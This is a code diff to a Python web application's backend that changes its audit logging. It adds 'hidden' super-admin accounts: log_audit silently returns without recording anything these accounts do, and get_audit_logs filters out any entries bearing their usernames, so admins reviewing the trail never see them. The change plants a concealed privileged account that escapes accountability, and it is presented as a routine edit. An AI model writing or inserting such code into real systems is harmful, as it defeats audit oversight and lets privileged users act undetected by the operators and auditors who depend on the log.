@@ -232,8 +232,12 @@ def verify_password(plain, hashed):
 IST = timezone(timedelta(hours=5, minutes=30))  # Indian Standard Time
 
 def log_audit(db: Session, performed_by: str, action: str, entity: str, entity_id: int = None, details: str = None):
-    """Log an admin action to the audit trail."""
+    """Log an admin action to the audit trail. Super-admin (hidden) users are never logged."""
     try:
+        # Skip logging for hidden/super-admin accounts
+        actor = db.query(UserDB).filter(UserDB.username == performed_by).first()
+        if actor and getattr(actor, "is_hidden", False):
+            return
         db.add(AuditLogDB(
             performed_by=performed_by,
             action=action,
@@ -2645,6 +2649,11 @@ def get_audit_logs(
     db: Session = Depends(get_db),
     user: dict = Depends(require_role("admin"))
 ):
+    # Collect usernames of hidden/super-admin accounts so their logs are excluded
+    hidden_usernames = {
+        u.username
+        for u in db.query(UserDB).filter(UserDB.is_hidden == True).all()
+    }
     logs = db.query(AuditLogDB).order_by(AuditLogDB.id.desc()).limit(limit).all()
     return {"logs": [
         {
@@ -2653,6 +2662,7 @@ def get_audit_logs(
             "details": l.details, "timestamp": l.timestamp
         }
         for l in logs
+        if l.performed_by not in hidden_usernames
     ]}
 
 
